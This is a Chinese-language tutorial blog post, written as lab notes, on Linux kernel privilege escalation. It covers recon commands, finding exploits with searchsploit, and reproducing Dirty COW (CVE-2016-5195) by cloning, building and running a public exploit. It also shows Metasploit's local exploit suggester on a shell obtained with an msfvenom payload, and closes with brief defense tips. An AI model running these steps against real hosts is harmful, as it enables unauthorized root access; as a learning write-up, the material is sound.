---
title: "Linux内核提权"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# Linux内核提权

顾名思义，即利用Linux内核漏洞进行提权，一般包含三个环节：

* 对目标系统进行信息收集，获取到系统内核信息以及版本信息
* 根据内核版本获取其对应的漏洞以及EXP
* 使用找到的EXP对目标系统发起攻击，完成提权操作

### 内核溢出

漏洞的原理更偏向于pwn，指在操作系统内核空间发生的缓冲区溢出漏洞。即程序没有正确验证输入数据的大小时，多出的数据会覆盖相邻的内存，导致安全问题

#### 信息收集

首先需要对Linux发行版本、内核版本进行信息收集，这里以我的CentOS 7为例，展示以下常用命令的输出内容：

~~~shell
uname -a	# 查看系统全部信息
~~~

![image-20240725161408117](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725161409405-752791162.png)

~~~shell
cat /etc/issue	# 查看Linux 系统的版本信息
~~~

![image-20240725162645654](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725162646942-1297550049.png)

不知道什么原因，这里文件中的占位符没有被解析，这些占位符的意思：

* `\S`：这表示系统的名称。在许多 Linux 发行版中，这通常会被替换为具体的发行版名称（例如 "Kali Linux"）。

* `\r`：这一部分通常表示系统的版本号，这是内核的版本信息。

* `\m`：这表示机器的硬件架构。例如，它可能会返回 `x86_64` 表示 64 位系统，或 `i686` 表示 32 位系统。

~~~shell
cat /etc/*-release	# 查看Linux 系统的详细版本信息
~~~

![image-20240725162847897](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725162848673-1081222333.png)

~~~shell
lsb_release -a	# 获取系统的详细信息，但系统不一定有lsb_release
~~~

![image-20240725162917109](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725162918156-1519238975.png)

~~~shell
cat /proc/version	# 查看 Linux 内核的版本信息及相关的编译信息
~~~

![image-20240725162940901](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725162941634-562397514.png)

#### 查找exp

使用kali自带的searchsploit即可查找exp，例如查找Ubantu 15.04的漏洞：

~~~shell
searchsploit Ubantu 15.04
~~~

查到后，比如exp的path为`linux/local/37088.c`：

* 查看exp：

  ~~~shell
  searchsploit -x linux/local/37088.c
  ~~~

  有几点需要注意阅读：

  * 源码注释：了解源码编译方式
  * 源码内容：了解工作流程便于优化与修改，且避免存在恶意后门

* 复制exp到当前目录：

  ~~~shell
  searchsploit -m linux/local/37088.c
  ~~~

#### 使用exp

通常使用wget等办法将exp传到受害主机上，并按照exp使用方法进行提权（借助搜素引擎查阅使用方法），通常来说：

* 如果是sh脚本文件，赋予权限执行即可
* 如果是c文件，通常是需要gcc编译，再给编译后的文件赋予权限，最后执行

### CVE-2016-5195（Dirty Cow脏牛）

脏牛提权的利用方式不同于其他的内核溢出提权，这里单独记录

脏牛是一个非常经典的内核提权漏洞，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞，在2016年10月18后才得以修复

**影响范围：**Linux kernel>2.6.22 (released in 2007)的所有Linux系统，且低于以下版本：

~~~
Centos7/RHEL7     3.10.0-327.36.3.el7
Cetnos6/RHEL6     2.6.32-642.6.2.el6
Ubuntu 16.10      4.8.0-26.28
Ubuntu 16.04      4.4.0-45.66
Ubuntu 14.04      3.13.0-100.147
Debian 8          3.16.36-1+deb8u2
Debian 7          3.2.82-1
~~~

#### 漏洞成因

linux内核的内存子系统在处理私有映射时的**写时复制（copy on write，COW）**的中断方式里创建了**条件竞争**，该条件竞争可能运行非特权用户获得对只读内存映射的写入权限

>写时复制是一种内存管理的优化技术，用于在多个进程共享同一个内存页的情况下避免内存冲突。当一个进程试图修改一个内存页时，操作系统会自动复制这个内存页，而不会受到当前进程修改的影响

#### 利用方式

默认情况下，低权限会话是无法修改高权限文件，比如 `/etc/passwd`、`/etc/shadow`、`/etc/group` 等。脏牛漏洞的利用方式是：首先使用 `mmap` 函数申请虚拟内存，在虚拟内存上找到一个页面创建私有映射（以 `/etc/group` 为例）。由于此映射是私有的，因此可以随意对文件写入修改而不会影响原文件，然后向私有映射文件中写入内容，将当前用户添加至 `sudo` 组，但不是直接向 `mmap` 申请的虚拟映射中写入内容，而是向 Linux 中的一个特殊文件 `/proc/self/mem` 中写入。

* `mmap` 函数是用来创建内存映射的函数。通过内存映射，可以将一段文件或其他对象映射到进程的地址空间，从而可以直接访问该对象。
* `/proc/self/mem` 文件是 Linux 的一个特殊文件，它允许程序直接访问当前进程的虚拟内存空间。通过读写 `/proc/self/mem` 文件，可以直接在虚拟内存中修改指定内存位置的数据。

写入 `/proc/self/mem` 完成后，内核需要在物理内存上寻找写入的位置，此时还未开始写入。并行运行两个线程，第一个线程的功能是写入物理内存，它包括两个操作，分别是定位到物理内存和写入物理内存。在定位物理内存位置时，内核发现物理内存中已经有了一个 `/etc/group` 文件，这时触发写时复制，内核准备在物理内存中找到位置创建私有映射的副本，然后写入。在写入之前，运行第二个线程，其功能是调用 `madvise` 函数，通知内核不再需要（MADV_DONTNEED）私有映射。这样，内核就有可能会被欺骗，认为程序写入的是原始文件。通过无限循环这两个线程，就有可能完成竞争条件，成功地写入原始文件

#### 漏洞影响

允许在没有足够权限的情况下修改只读文件比如`/etc/passwd`，导致权限提升

#### 漏洞复现

主机版本：

![image-20240726172050314](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240726172051641-1337059010.png)

满足条件，开始漏洞利用，这里直接使用github上的exp：[gbonacini/CVE-2016-5195: A CVE-2016-5195 exploit example. (github.com)](https://github.com/gbonacini/CVE-2016-5195)

 ~~~shell
# 首先下载exp，由于装了git，这里就直接clone了
git clone https://github.com/gbonacini/CVE-2016-5195.git

# 进入目录make生成可执行文件
make

# 执行make好的文件，即可自动完成利用并提权
./dcow -s
 ~~~

![image-20240726164601582](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240726164602670-1980545594.png)

**注**：主机上需要有gcc，且执行make后的 gcc 版本要较高版本

当然还有其他版本比如：https://github.com/FireFart/dirtycow

### Metasploit

因为msf是一个常用的后渗透模块，这里再记录一下使用其中`local_exploit_suggester`模块的事项：

该模块会检测系统是否存在漏洞并根据漏洞，回显利用模块路径

依然以上面的ubuntu为例：

* 首先getshell（我这里直接用msfvenom生成的马子上线）

  ![image-20240727022254480](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727022256072-972942248.png)

* bg挂起会话，再use一下`post/multi/recon/local_exploit_suggester`模块，设置一下shell的session，即可自动检查：

  ![image-20240727022830406](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727022832204-2071525865.png)

  发现有很多可能的漏洞，直接use填好参数即可利用

### 如何防御？

感觉没啥可说的，无非就以下这些：

* 定期检查是否有可用的更新或补丁
* 使用防火墙阻止攻击者尝试利用内核漏洞进行攻击的网络连接
* 使用安全软件来检测和阻止恶意软件的运行